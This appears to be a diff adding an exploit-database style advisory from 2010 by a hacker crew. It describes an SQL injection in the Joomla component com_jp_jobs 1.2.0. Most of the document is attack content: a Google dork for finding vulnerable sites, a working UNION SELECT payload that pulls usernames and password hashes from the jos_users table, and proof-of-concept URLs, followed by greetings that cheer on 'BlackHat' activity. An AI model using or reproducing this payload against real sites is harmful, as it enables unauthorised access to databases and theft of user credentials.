@@ -1,0 +1,69 @@
+     )   )            )                     (   (         (   (    (       )     ) 
+  ( /(( /( (       ( /(  (       (    (     )\ ))\ )      )\ ))\ ) )\ ) ( /(  ( /( 
+  )\())\()))\ )    )\()) )\      )\   )\   (()/(()/(  (  (()/(()/((()/( )\()) )\())
+ ((_)((_)\(()/(   ((_)((((_)(  (((_)(((_)(  /(_))(_)) )\  /(_))(_))/(_))(_)\|((_)\ 
+__ ((_)((_)/(_))___ ((_)\ _ )\ )\___)\ _ )\(_))(_))_ ((_)(_))(_)) (_))  _((_)_ ((_)
+\ \ / / _ (_)) __\ \ / (_)_\(_)(/ __(_)_\(_) _ \|   \| __| _ \ |  |_ _|| \| | |/ / 
+ \ V / (_) || (_ |\ V / / _ \  | (__ / _ \ |   /| |) | _||   / |__ | | | .` | ' <  
+  |_| \___/  \___| |_| /_/ \_\  \___/_/ \_\|_|_\|___/|___|_|_\____|___||_|\_|_|\_\
+										.WEB.ID
+-----------------------------------------------------------------------
+  Joomla Component com_jp_jobs 1.2.0 (id) SQL Injection Vulnerability
+-----------------------------------------------------------------------
+Author  	: v3n0m
+Site    	: http://yogyacarderlink.web.id/
+Date		: April, 13-2010
+Location	: Jakarta, Indonesia
+Time Zone	: GMT +7:00
+----------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application	: JP Jobs
+Vendor  	: http://www.joomlanetprojects.com/
+License 	: Non-Commercial
+Version 	: 1.2.0 Lower versions may also be affected
+Google Dork    	: inurl:com_jp_jobs
+
+JP Jobs es un componente sencillo para mostrar ofertas laborales en nuestro Joomla!, dispone 
+de un gestor de ofertas que pueden publicarse o despublicarse en el backend y ser mostradas 
+en formato tabla en la parte publica de una forma general y con una vista de detalle o por categorias.
+----------------------------------------------------------------
+
+Exploitz:
+~~~~~~~
+-999999/**/union/**/all/**/select/**/1,2,group_concat(username,char(58),password)v3n0m,4,5,6,7,8,9,10,11,12,13,14/**/from/**/jos_users--
+
+
+SQli p0c:
+~~~~~~~
+
+Check the component version on target first
+http://sitetarget/[path]/administrator/components/com_jp_jobs/jp_jobs.xml
+if the component <version>1.2.0</version> it could be vulnerable
+
+http://127.0.0.1/[path]/index.php?option=com_jp_jobs&view=detail&id=[SQLi]
+http://127.0.0.1/[path]/index.php?option=com_jp_jobs&view=detail&id=-999999/**/union/**/all/**/select/**/1,2,group_concat(username,char(58),password)v3n0m,4,5,6,7,8,9,10,11,12,13,14/**/from/**/jos_users--
+----------------------------------------------------------------
+
+Shoutz:
+~~~~
+
+- 'Happy 6 th Anniversary for YOGYACARDERLINK, keep BlackHat!'
+- LeQhi,lingah,GheMaX,spykit,m4rco,z0mb13,ast_boy,eidelweiss,xx_user,^pKi^,tian,zhie_o,JaLi-
+- setanmuda,oche_an3h,onez,Joglo,d4rk_kn19ht,Cakill Schumbag
+- kiddies,whitehat,c4ur [thx for the martabak],mywisdom,yadoy666
+- elicha cristia [kamu...!! hahaha absurd girl,i like it and i...]
+- N.O.C & Technical Support @office
+- #yogyacarderlink @irc.dal.net
+----------------------------------------------------------------
+Contact:
+~~~~
+
+v3n0m | YOGYACARDERLINK CREW | v3n0m666[0x40]live[0x2E]com
+Homepage: http://yogyacarderlink.web.id/
+	  http://v3n0m.blogdetik.com/
+	  http://elich4.blogspot.com/ << Update donk >_<
+
+---------------------------[EOF]--------------------------------
